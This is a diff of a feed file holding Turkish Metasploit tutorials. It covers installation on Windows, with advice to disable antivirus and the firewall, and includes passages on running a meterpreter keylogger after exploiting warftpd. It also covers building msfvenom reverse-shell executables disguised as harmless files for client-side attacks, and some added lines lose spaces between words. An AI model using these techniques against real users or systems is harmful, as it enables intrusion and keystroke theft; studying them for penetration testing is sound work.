@@ -24,7 +24,7 @@
       <description>
         
         
-        &lt;p&gt;Metasploit Framework&amp;rsquo;ü Windows&amp;rsquo;a yüklemek, penetrasyon testi ve güvenlik değerlendirmeleri yapmak isteyen  siber güvenlik profesyonelleri ve meraklıları için önemli bir adımdır. Bu kılavuz, ön koşullar, kurulum adımları ve ilk kurulum dahil olmak üzere kurulum sürecinde size yol gösterecektir.&lt;/p&gt;
+        &lt;p&gt;Metasploit Framework&amp;rsquo;ü Windows&amp;rsquo;a yüklemek, penetrasyon testi ve güvenlik değerlendirmeleri yapmak isteyensiber güvenlikprofesyonelleri ve meraklıları için önemli bir adımdır. Bu kılavuz, ön koşullar, kurulum adımları ve ilk kurulum dahil olmak üzere kurulum sürecinde size yol gösterecektir.&lt;/p&gt;
 &lt;h2&gt;Metasploit Framework&amp;rsquo;e Genel Bakış&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;metasploit-frameworke-genel-bakış&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#metasploit-frameworke-genel-bak%c4%b1%c5%9f&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;!-- /wp:heading --&gt;
 &lt;p&gt;Metasploit Framework, güvenlik uzmanlarının sistemlerdeki güvenlik açıklarını bulmalarına, bunları istismar etmelerine ve güvenlik önlemlerini doğrulamalarına olanak tanıyan açık kaynaklı bir penetrasyon testi platformudur. Kali Linux gibi Linux ortamlarında yaygın olarak kullanılsa da Windows kullanıcıları için de mevcuttur. Framework, ağ güvenliğinin test edilmesini kolaylaştıran çeşitli araçlar ve yardımcı programlar içerir.&lt;/p&gt;
@@ -33,21 +33,21 @@
 &lt;p&gt;Metasploit Framework&amp;rsquo;ü Windows&amp;rsquo;a yüklemeden önce sisteminizin aşağıdaki gereksinimleri karşıladığından emin olun:&lt;/p&gt;
 &lt;!-- wp:list --&gt;
 &lt;ul class=&#34;wp-block-list&#34;&gt;&lt;!-- wp:list-item --&gt;
-- ***İşletim Sistemi***  : Windows 10 veya üzeri (Windows 11 de desteklenmektedir). 
+- ***İşletim Sistemi*** : Windows 10 veya üzeri (Windows 11 de desteklenmektedir). 
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;em&gt;&lt;strong&gt;Yönetici Ayrıcalıkları&lt;/strong&gt;&lt;/em&gt;  : Yazılımı yüklemek için yönetici haklarına sahip olmanız gerekir.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;&lt;strong&gt;Yönetici Ayrıcalıkları&lt;/strong&gt;&lt;/em&gt; : Yazılımı yüklemek için yönetici haklarına sahip olmanız gerekir.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;em&gt;&lt;strong&gt;Sistem Gereksinimleri&lt;/strong&gt;&lt;/em&gt;  : En az 4 GB RAM ve yeterli disk alanı (en az 1 GB).&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;&lt;strong&gt;Sistem Gereksinimleri&lt;/strong&gt;&lt;/em&gt; : En az 4 GB RAM ve yeterli disk alanı (en az 1 GB).&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;em&gt;&lt;strong&gt;Güvenlik Duvarı ve Antivirüs Ayarları&lt;/strong&gt;&lt;/em&gt;  : Kurulum sırasında etkin güvenlik duvarlarını veya antivirüs yazılımlarını geçici olarak devre dışı bırakın; çünkü bunlar kurulum sürecini etkileyebilir.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;&lt;strong&gt;Güvenlik Duvarı ve Antivirüs Ayarları&lt;/strong&gt;&lt;/em&gt; : Kurulum sırasında etkin güvenlik duvarlarını veya antivirüs yazılımlarını geçici olarak devre dışı bırakın; çünkü bunlar kurulum sürecini etkileyebilir.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt; 
 &lt;!-- /wp:list --&gt;
@@ -57,11 +57,11 @@
     &lt;a href=&#34;#ad%c4%b1m-1-y%c3%bckleyiciyi-indirin&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;!-- /wp:heading --&gt;
 &lt;!-- wp:list {&#34;ordered&#34;:true} --&gt;
 &lt;ol class=&#34;wp-block-list&#34;&gt;&lt;!-- wp:list-item --&gt;
-- Web tarayıcınızı açın ve &lt;a href=&#34;https://www.rapid7.com/products/metasploit/download.jsp&#34;&gt;Rapid7 Metasploit indirme sayfasına&lt;/a&gt; gidin . 
+- Web tarayıcınızı açın ve&lt;a href=&#34;https://www.rapid7.com/products/metasploit/download.jsp&#34;&gt;Rapid7 Metasploit indirme sayfasına&lt;/a&gt;gidin . 
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;En son Windows yükleyicisi için bağlantıya tıklayın (genellikle adı &lt;code&gt;metasploit-latest.msi&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;En son Windows yükleyicisi için bağlantıya tıklayın (genellikle adı&lt;code&gt;metasploit-latest.msi&lt;/code&gt;).&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
@@ -74,11 +74,11 @@
     &lt;a href=&#34;#ad%c4%b1m-2-kuruluma-haz%c4%b1rl%c4%b1k&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;!-- /wp:heading --&gt;
 &lt;!-- wp:list {&#34;ordered&#34;:true} --&gt;
 &lt;ol class=&#34;wp-block-list&#34;&gt;&lt;!-- wp:list-item --&gt;
-- ***Antivirüs  Yazılımını***  Devre Dışı Bırakın : Yükleyiciyi çalıştırmadan önce, herhangi bir antivirüs programını geçici olarak devre dışı bırakın. Bu, Metasploit&#39;i yanlışlıkla kötü amaçlı yazılım olarak işaretlemelerini önler. 
+- ***AntivirüsYazılımını*** Devre Dışı Bırakın : Yükleyiciyi çalıştırmadan önce, herhangi bir antivirüs programını geçici olarak devre dışı bırakın. Bu, Metasploit&#39;i yanlışlıkla kötü amaçlı yazılım olarak işaretlemelerini önler. 
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;em&gt;&lt;strong&gt;Windows Güvenlik Duvarını devre dışı bırakın&lt;/strong&gt;&lt;/em&gt;  : Denetim Masası &amp;gt; Sistem ve Güvenlik &amp;gt; Windows Defender Güvenlik Duvarı&amp;rsquo;na gidin ve güvenlik duvarını geçici olarak kapatın.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;&lt;strong&gt;Windows Güvenlik Duvarını devre dışı bırakın&lt;/strong&gt;&lt;/em&gt; : Denetim Masası &amp;gt; Sistem ve Güvenlik &amp;gt; Windows Defender Güvenlik Duvarı&amp;rsquo;na gidin ve güvenlik duvarını geçici olarak kapatın.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt; 
 &lt;!-- /wp:list --&gt;
@@ -90,12 +90,12 @@
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;code&gt;metasploit-latest.msi&lt;/code&gt; dosyasına sağ tıklayıp &lt;em&gt;&lt;strong&gt;Yönetici Olarak Çalıştır&amp;rsquo;ı&lt;/strong&gt;&lt;/em&gt;  seçin .&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;metasploit-latest.msi&lt;/code&gt; dosyasına sağ tıklayıp&lt;em&gt;&lt;strong&gt;Yönetici Olarak Çalıştır&amp;rsquo;ı&lt;/strong&gt;&lt;/em&gt;  seçin.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;Kullanıcı Hesabı Denetimi (UAC) tarafından istendiğinde, değişikliklere izin vermek için &lt;em&gt;&lt;strong&gt;Evet&amp;rsquo;e tıklayın.&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;Kullanıcı Hesabı Denetimi (UAC) tarafından istendiğinde,değişikliklere izin vermek için&lt;em&gt;&lt;strong&gt;Evet&amp;rsquo;e tıklayın.&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt; 
 &lt;!-- /wp:list --&gt;
@@ -103,26 +103,26 @@
     &lt;a href=&#34;#ad%c4%b1m-4-kurulum-istemlerini-takip-edin&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;!-- /wp:heading --&gt;
 &lt;!-- wp:list {&#34;ordered&#34;:true} --&gt;
 &lt;ol class=&#34;wp-block-list&#34;&gt;&lt;!-- wp:list-item --&gt;
-- Kurulum ekranı görüntülendiğinde devam etmek için ***İleri&#39;ye***  tıklayın . 
+- Kurulum ekranı görüntülendiğinde devam etmek için***İleri&#39;ye*** tıklayın . 
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;Lisans sözleşmesini okuyun ve ***Lisans sözleşmesini kabul ediyorum&amp;rsquo;u seçip *** &lt;em&gt;&lt;strong&gt;İleri&amp;rsquo;ye&lt;/strong&gt;&lt;/em&gt;  tıklayın .&lt;/li&gt;
+&lt;li&gt;Lisans sözleşmesini okuyun ve&lt;em&gt;&lt;strong&gt;Lisans sözleşmesini kabul ediyorum&amp;rsquo;u seçip&lt;/strong&gt;&lt;/em&gt; &lt;em&gt;&lt;strong&gt;İleri&amp;rsquo;ye&lt;/strong&gt;&lt;/em&gt; tıklayın.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;Kurulum dizininizi seçin (varsayılan &lt;code&gt;C:\metasploit-framework&lt;/code&gt;&amp;lsquo;dir ). &lt;em&gt;&lt;strong&gt;İleri&amp;rsquo;ye&lt;/strong&gt;&lt;/em&gt;  tıklayın .&lt;/li&gt;
+&lt;li&gt;Kurulum dizininizi seçin (varsayılan &lt;code&gt;C:\metasploit-framework&lt;/code&gt;&amp;lsquo;dir ).&lt;em&gt;&lt;strong&gt;İleri&amp;rsquo;ye&lt;/strong&gt;&lt;/em&gt; tıklayın.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;em&gt;&lt;strong&gt;Kurulum sürecini başlatmak için Yükle&amp;rsquo;ye&lt;/strong&gt;&lt;/em&gt;  tıklayın . Bu, sisteminizin performansına bağlı olarak birkaç dakika sürebilir.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;&lt;strong&gt;Kurulum sürecini başlatmak için Yükle&amp;rsquo;ye&lt;/strong&gt;&lt;/em&gt; tıklayın. Bu, sisteminizin performansına bağlı olarak birkaç dakika sürebilir.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;Kurulum tamamlandıktan sonra &lt;em&gt;&lt;strong&gt;Son&amp;rsquo;a&lt;/strong&gt;&lt;/em&gt;  tıklayın .&lt;/li&gt;
+&lt;li&gt;Kurulum tamamlandıktan sonra&lt;em&gt;&lt;strong&gt;Son&amp;rsquo;a&lt;/strong&gt;&lt;/em&gt; tıklayın .&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt; 
 &lt;!-- /wp:list --&gt;
@@ -139,7 +139,7 @@
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;Komut İstemi&amp;rsquo;ne sağ tıklayın ve &lt;em&gt;&lt;strong&gt;Yönetici Olarak Çalıştır&amp;rsquo;ı&lt;/strong&gt;&lt;/em&gt;  seçin .&lt;/li&gt;
+&lt;li&gt;Komut İstemi&amp;rsquo;ne sağ tıklayın ve&lt;em&gt;&lt;strong&gt;Yönetici Olarak Çalıştır&amp;rsquo;ı&lt;/strong&gt;&lt;/em&gt; seçin .&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt; 
 &lt;!-- /wp:list --&gt;
@@ -166,7 +166,7 @@
 &lt;!-- /wp:list --&gt;
 &lt;!-- wp:list --&gt;
 &lt;ul class=&#34;wp-block-list&#34;&gt;&lt;!-- wp:list-item --&gt;
-- Veritabanı yapılandırmasını başlatmak için &lt;code&gt;y&lt;/code&gt;veya yazın .&lt;code&gt;yes&lt;/code&gt; 
+- Veritabanı yapılandırmasını başlatmak için&lt;code&gt;y&lt;/code&gt;veyayazın .&lt;code&gt;yes&lt;/code&gt; 
 &lt;!-- /wp:list-item --&gt; 
 &lt;!-- /wp:list --&gt;
 &lt;!-- wp:list {&#34;ordered&#34;:true,&#34;start&#34;:4} --&gt;
@@ -245,22 +245,22 @@
 &lt;p&gt;Metasploit&amp;rsquo;i Windows&amp;rsquo;a yüklerken kullanıcılar birkaç yaygın sorunla karşılaşabilir:&lt;/p&gt;
 &lt;!-- wp:list --&gt;
 &lt;ul class=&#34;wp-block-list&#34;&gt;&lt;!-- wp:list-item --&gt;
-- ***Kurulum Erken Başarısız Oluyor***  : Kuruluma başlamadan önce tüm antivirüs yazılımlarını ve güvenlik duvarlarını devre dışı bıraktığınızdan emin olun. 
+- ***Kurulum Erken Başarısız Oluyor*** : Kuruluma başlamadan önce tüm antivirüs yazılımlarını ve güvenlik duvarlarını devre dışı bıraktığınızdan emin olun. 
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;em&gt;&lt;strong&gt;Veritabanı Bağlantı Sorunları&lt;/strong&gt;&lt;/em&gt;  : Eğer msfconsole veritabanına bağlanamadığını bildiriyorsa, PostgreSQL&amp;rsquo;in düzgün çalıştığını doğrulayın.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;&lt;strong&gt;Veritabanı Bağlantı Sorunları&lt;/strong&gt;&lt;/em&gt; : Eğer msfconsole veritabanına bağlanamadığını bildiriyorsa, PostgreSQL&amp;rsquo;in düzgün çalıştığını doğrulayın.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;em&gt;&lt;strong&gt;Yavaş Performans&lt;/strong&gt;&lt;/em&gt;  : Kaynak yönetimi farklılıklarından dolayı Metasploit&amp;rsquo;i Windows&amp;rsquo;ta çalıştırmak Linux sistemlerine göre daha yavaş olabilir; sisteminizin minimum gereksinimleri karşıladığından emin olun.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;&lt;strong&gt;Yavaş Performans&lt;/strong&gt;&lt;/em&gt; : Kaynak yönetimi farklılıklarından dolayı Metasploit&amp;rsquo;i Windows&amp;rsquo;ta çalıştırmak Linux sistemlerine göre daha yavaş olabilir; sisteminizin minimum gereksinimleri karşıladığından emin olun.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt; 
 &lt;!-- /wp:list --&gt;
 &lt;h2&gt;Sonuç&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;sonuç&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#sonu%c3%a7&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;!-- /wp:heading --&gt;
-&lt;p&gt;Metasploit Framework&amp;rsquo;ü Windows&amp;rsquo;a kurmak, penetrasyon testi ve güvenlik değerlendirmeleri için geniş bir olasılık yelpazesi sunar. Bu ayrıntılı kılavuzu izleyerek, Metasploit Framework&amp;rsquo;ü Windows makinenize başarıyla kurabilir ve ayarlayabilir ve  siber güvenlik uygulamalarındaki güçlü yeteneklerini keşfedebilirsiniz.&lt;/p&gt;
+&lt;p&gt;Metasploit Framework&amp;rsquo;ü Windows&amp;rsquo;a kurmak, penetrasyon testi ve güvenlik değerlendirmeleri için geniş bir olasılık yelpazesi sunar. Bu ayrıntılı kılavuzu izleyerek, Metasploit Framework&amp;rsquo;ü Windows makinenize başarıyla kurabilir ve ayarlayabilir vesiber güvenlikuygulamalarındaki güçlü yeteneklerini keşfedebilirsiniz.&lt;/p&gt;
 &lt;p&gt;Herhangi bir sistemi veya ağı test etmeden önce izin aldığınızdan emin olarak, bu araçları her zaman yasal sınırlar içerisinde sorumlu ve etik bir şekilde kullanmayı unutmayın.&lt;/p&gt;
 &lt;p&gt;Metasploit&amp;rsquo;in işlevlerini öğrenerek ve güncel tutarak, ağ güvenliğindeki becerilerinizi önemli ölçüde artıracak ve aynı zamanda kuruluşunuzdaki veya kişisel projelerinizdeki siber güvenlik çalışmalarına olumlu katkıda bulunacaksınız.&lt;/p&gt;
 &lt;p&gt;Alıntılar:&lt;br&gt;[1] &lt;a href=&#34;https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/&lt;/a&gt;&lt;br&gt;[2] &lt;a href=&#34;https://www.youtube.com/watch?v=y4-oIl6bkbE&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.youtube.com/watch?v=y4-oIl6bkbE&lt;/a&gt;&lt;br&gt;[3] &lt;a href=&#34;https://blog.didierstevens.com/2017/08/14/using-metasploit-on-windows/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://blog.didierstevens.com/2017/08/14/using-metasploit-on-windows/&lt;/a&gt;&lt;br&gt;[4] &lt;a href=&#34;https://www.youtube.com/watch?v=fhR9jkgPiKg&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.youtube.com/watch?v=fhR9jkgPiKg&lt;/a&gt;&lt;br&gt;[5] &lt;a href=&#34;https://www.youtube.com/watch?v=IuXmboYm3Gk&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.youtube.com/watch?v=IuXmboYm3Gk&lt;/a&gt;&lt;br&gt;[6&lt;br&gt;] &lt;a href=&#34;https://help.rapid7.com/metasploit/Content/getting-started/gsg-pro.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://help.rapid7.com/metasploit/Content/getting-started/gsg-pro.html&lt;/a&gt; [7] &lt;a href=&#34;https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html&lt;/a&gt;&lt;br&gt;[8] &lt;a href=&#34;https://www.metasploit.com/get-started&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.metasploit.com/get-started&lt;/a&gt;&lt;/p&gt;
@@ -530,7 +530,7 @@
       <description>
         
         
-        &lt;p&gt; Metasploit Framework is a software used in penetration testing and security testing. The Pro version  of the software developed by Rapid7is distributed for a fee and has visual interface support.&lt;/p&gt;
+        &lt;p&gt;Metasploit Framework is a software used in penetration testing and security testing. The Pro versionof the softwaredeveloped by Rapid7is distributed for a fee and has visual interface support.&lt;/p&gt;
 &lt;p&gt;Metasploit Framework comes pre-installed in Kali distributions, etc. Even if you don&amp;rsquo;t use Kali, you can install it on your own Linux distribution. In this article, we will examine how to install the free version, which is the Community version and works from the command line. It is estimated that the commands used in the explanation will work in all Ubuntu-based distributions. We performed our tests and trials on the Linux Mint 18.1 Cinnamon Linux distribution.&lt;/p&gt;
 &lt;h3 class=&#34;wp-block-heading&#34; id=&#34;linux-mint-güncelleyelim&#34;&gt;Let&#39;s Update Linux Mint:
 &lt;!-- /wp:heading --&gt;
@@ -1936,7 +1936,7 @@ meterpreter ***&amp;gt;***
 &lt;!-- wp:heading {&#34;level&#34;:1} --&gt;
 &lt;h1 class=&#34;wp-block-heading&#34; id=&#34;metasploit-içinde-keylogger-kullanımı&#34;&gt;Metasploit içinde Keylogger Kullanımı 
 &lt;!-- /wp:heading --&gt;
-&lt;p&gt;Bir sisteme giriş sağlandığında iki yaklaşım sergileyebilirsiniz. &lt;em&gt;Çok hızlı&lt;/em&gt; olmak veya &lt;em&gt;çok yavaş&lt;/em&gt; olmak. Keylogger, yani kullanıcının tuşlarını ve yazdıklarını kaydetmek, yavaş yaklaşıma bir örnektir. Bu yaklaşımda, gerçekleştirmek istediğiniz işlemleri çok hızlı yapamazsınız ancak uzun vadede çok kullanışlı bilgiler elde edebilirsiniz.&lt;/p&gt;
+&lt;p&gt;Bir sisteme giriş sağlandığında iki yaklaşım sergileyebilirsiniz.&lt;em&gt;Çok hızlı&lt;/em&gt;olmak veya&lt;em&gt;çok yavaş&lt;/em&gt;olmak. Keylogger, yani kullanıcının tuşlarını ve yazdıklarını kaydetmek, yavaş yaklaşıma bir örnektir. Bu yaklaşımda, gerçekleştirmek istediğiniz işlemleri çok hızlı yapamazsınız ancak uzun vadede çok kullanışlı bilgiler elde edebilirsiniz.&lt;/p&gt;
 &lt;p&gt;Öncelikle, bir exploit modülü kullanarak hedef sistemde oturum çalım.&lt;/p&gt;
 &lt;!-- wp:code --&gt;
 &lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code lang=&#34;bash&#34; class=&#34;language-bash&#34;&gt;msf exploit***(*** warftpd_165_user***)***  ***&amp;gt;***  exploit
@@ -5281,143 +5281,214 @@ uid***=*** 0***(*** root***)***  gid***=*** 0***(*** root***)***  groups***=*** 
       <description>
         
         
-        &lt;!-- wp:heading {&#34;level&#34;:1} --&gt;
-&lt;h1 class=&#34;wp-block-heading&#34; id=&#34;i̇stemci-taraflı-saldırılar&#34;&gt;İstemci Taraflı Saldırılar 
-&lt;!-- /wp:heading --&gt;
-&lt;p&gt;İstemci tarafı saldırılar, tüm ağ yöneticilerinin dikkat etmesi gerekli türden saldırılardır. Sisteminizin güvenliğini ne kadar sağlasanız da istemci tarafı saldırılar, kullanıcılarınızın zafiyetlerini kullanırlar.&lt;/p&gt;
+        &lt;h1&gt;İstemci Taraflı Saldırılar&lt;/h1&gt;&lt;p&gt;İstemci tarafı saldırılar, tüm ağ yöneticilerinin dikkat etmesi gerekli türden saldırılardır. Sisteminizin güvenliğini ne kadar sağlasanız da istemci tarafı saldırılar, kullanıcılarınızın zafiyetlerini kullanırlar.&lt;/p&gt;
 &lt;p&gt;Pentest işlemi gerçekleştirenler, sistemde bulunan kullanıcının, bir şekilde linke tıklamasını veya zararlı yazılım çalıştırmasını sağladığında kendilerine hedef sistemde kapı açmış olurlar. Bu sebeple, istemci taraflı saldırılar, kullanıcıyla etkileşim gerektirmektedir. Bu tür saldırılar, sosyal mühendislik çalışmalarını da gerektirir.&lt;/p&gt;
 &lt;p&gt;Metasploit Framework, bu tür zararlı kodların oluşturması için bir çok modül sağlamaktadır.&lt;/p&gt;
-&lt;!-- wp:heading {&#34;level&#34;:1} --&gt;
-&lt;h1 class=&#34;wp-block-heading&#34; id=&#34;binary-payloads&#34;&gt;binary payloads 
-&lt;!-- /wp:heading --&gt;
-&lt;p&gt;binary payloads olarak adlandırılan çalıştırılabilir dosyalar, zararsız .exe dosyaları gibi görünse de aslında içinde tehlikeli kodlar bulunduran dosyalardır. Dosyayı alacak kullanıcıya, önemli bir dosya hissi uyandırarak tıklaması sağlanır ve zararlı kod çalışır.&lt;/p&gt;
-&lt;p&gt;Bu yazıda, Metasploit Framework tarafından sağlanan &lt;code&gt;msfvenom&lt;/code&gt; komut satırı aracı kullanılacaktır. &lt;code&gt;msfvenom&lt;/code&gt; kullanarak &lt;code&gt;.exe&lt;/code&gt;, &lt;code&gt;perl&lt;/code&gt; veya &lt;code&gt;c&lt;/code&gt; program çıktıları elde edebilirsiniz. Burada &lt;code&gt;.exe&lt;/code&gt; formatı kullanılacaktır.&lt;/p&gt;
-&lt;h2 class=&#34;wp-block-heading&#34; id=&#34;windows-reverse-shell-açan-payload-oluşturma&#34;&gt;Windows Reverse Shell Açan Payload Oluşturma
-&lt;!-- /wp:heading --&gt;
-&lt;p&gt;Hedef kullanıcının zararlı programı çalıştırdığında dinleyen IP adresine bağlanması için bir payload oluşturmak için &lt;code&gt;windows/shell/reverse_tcp&lt;/code&gt; modülünü kullanacağız. Öncelikle bu modülün çalışmak için hangi değişkenlere ihtiyaç duyduğuna bakalım.&lt;/p&gt;
-&lt;!-- wp:code --&gt;
-&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code lang=&#34;bash&#34; class=&#34;language-bash&#34;&gt;root@kali:~# msfvenom --payload-options -p windows/shell/reverse_tcp
-Options ***for *** payload/windows/shell/reverse_tcp:
+&lt;h1&gt;binary payloads&lt;/h1&gt;&lt;p&gt;binary payloads olarak adlandırılan çalıştırılabilir dosyalar, zararsız .exe dosyaları gibi görünse de aslında içinde tehlikeli kodlar bulunduran dosyalardır. Dosyayı alacak kullanıcıya, önemli bir dosya hissi uyandırarak tıklaması sağlanır ve zararlı kod çalışır.&lt;/p&gt;
+&lt;p&gt;Bu yazıda, Metasploit Framework tarafından sağlanan &lt;code&gt;msfvenom&lt;/code&gt; komut satırı aracı kullanılacaktır. &lt;code&gt;msfvenom&lt;/code&gt; kullanarak &lt;code&gt;.exe&lt;/code&gt;, &lt;code&gt;perl&lt;/code&gt; veya &lt;code&gt;c&lt;/code&gt; program çıktıları elde edebilirsiniz. Burada &lt;code&gt;.exe&lt;/code&gt; formatı kullanılacaktır.&lt;/p&gt;
+&lt;h2&gt;Windows Reverse Shell Açan Payload Oluşturma&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;windows-reverse-shell-açan-payload-oluşturma&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#windows-reverse-shell-a%c3%a7an-payload-olu%c5%9fturma&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Hedef kullanıcının zararlı programı çalıştırdığında dinleyen IP adresine bağlanması için bir payload oluşturmak için &lt;code&gt;windows/shell/reverse_tcp&lt;/code&gt; modülünü kullanacağız. Öncelikle bu modülün çalışmak için hangi değişkenlere ihtiyaç duyduğuna bakalım.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
 
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@kali:~# msfvenom --payload-options -p windows/shell/reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Options &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; payload/windows/shell/reverse_tcp:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       Name: Windows Command Shell, Reverse TCP Stager
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     Module: payload/windows/shell/reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Platform: Windows
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       Arch: x86
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Needs Admin: No
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Total size: &lt;span class=&#34;m&#34;&gt;281&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       Rank: Normal
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Provided by:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    spoonm 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    sf 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    hdm 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    skape 
